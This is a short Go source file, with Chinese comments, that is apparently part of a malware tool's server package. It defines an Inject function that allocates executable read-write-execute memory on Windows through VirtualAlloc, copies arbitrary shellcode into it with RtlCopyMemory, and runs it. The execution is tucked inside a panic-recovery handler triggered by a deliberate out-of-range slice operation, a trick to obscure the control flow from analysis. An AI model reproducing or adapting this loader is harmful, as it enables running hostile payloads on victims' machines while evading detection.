package server

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MemCommit            = 0x1000 //将该内存映射到物理内存
	MemReserve           = 0x2000 //开辟一块内存，供shellcode进程使用，即保留内存
	PageExecuteReadwrite = 0x40   //此块内存可以执行代码，加载器可以对该此块进行操作。即execute、read、write
)

var (
	//调用winApi
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用Windows内核
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll，进行内存操作
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //申请内存空间
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //内存块复制
)

//Inject shellcode注入函数
func Inject(b []byte) {

	//捕获数组下标越界
	defer func() {
		if err := recover(); err != nil {
			//使用内存操作api开辟一块内存，然后将shellcode的字节流写入
			addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), MemCommit|MemReserve, PageExecuteReadwrite)
			if err != nil && err.Error() != "The operation completed successfully." {
				syscall.Exit(0)
			}
			//非重叠复制内存区域，将这片内存复制
			_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
			if err != nil && err.Error() != "The operation completed successfully." {
				syscall.Exit(0)
			}
			//执行成功之后会返回The operation completed successfully，所以直接将其打印出来
			fmt.Println(err)
			syscall.SyscallN(addr, 0, 0, 0, 0)
		}
	}()

	var count []int
	//使之数组下标越界
	count = append(count[:1], count[2:]...)
}
